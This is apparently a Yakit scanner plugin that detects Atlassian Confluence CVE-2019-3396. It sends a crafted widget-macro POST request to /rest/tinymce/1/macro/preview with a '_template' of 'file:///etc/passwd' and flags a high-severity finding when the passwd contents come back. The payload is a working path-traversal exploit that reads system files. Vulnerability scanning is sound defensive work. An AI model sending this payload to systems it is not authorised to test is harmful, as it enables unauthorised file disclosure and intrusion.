# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port, payload){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `
POST {{params(payload)}} HTTP/1.1
Host: {{params(target)}}
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Referer: http://{{params(target)}}/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&
Content-Type: application/json; charset=utf-8
Content-Length: 176

{
  "contentId": "786458",
  "macro": {
    "body": "",
    "name": "widget",
    "params": {
      " height": "1000",
      "_template": "file:///etc/passwd",
      "url": "https://www.viddler.com/v/23464dc6",
      "width": "1000"
    }
  }
}`
    // println(payload)
    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr,"payload":payload}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    // dump(rsp)
    if len(rsp) > 0 {
        if str.MatchAnyOfRegexp(rsp, `\w+:\w+:\d+:\d+:\w+:/\w+|:|/\w+:|/\w+`) && str.MatchAllOfSubString(rsp, `HTTP/1.1 200`){
            yakit.Info("%v found Atlassian Confluence_CVE-2019-3396路径穿越与命令执行漏洞", addr)
            risk.NewRisk(
            addr,risk.title("Atlassian Confluence_CVE-2019-3396路径穿越与命令执行漏洞"),
            risk.severity("high"),
            risk.titleVerbose("Atlassian Confluence_CVE-2019-3396路径穿越与命令执行漏洞存在"),
            risk.type("RCE[Atlassian Confluence]"),
            risk.payload(`/rest/tinymce/1/macro/preview`),
            risk.request(string(req)),
            risk.response(string(rsp)),
        )
        }
       
    }

    return
}
handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }
    payload = `/rest/tinymce/1/macro/preview`

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port, payload)
    }
    
}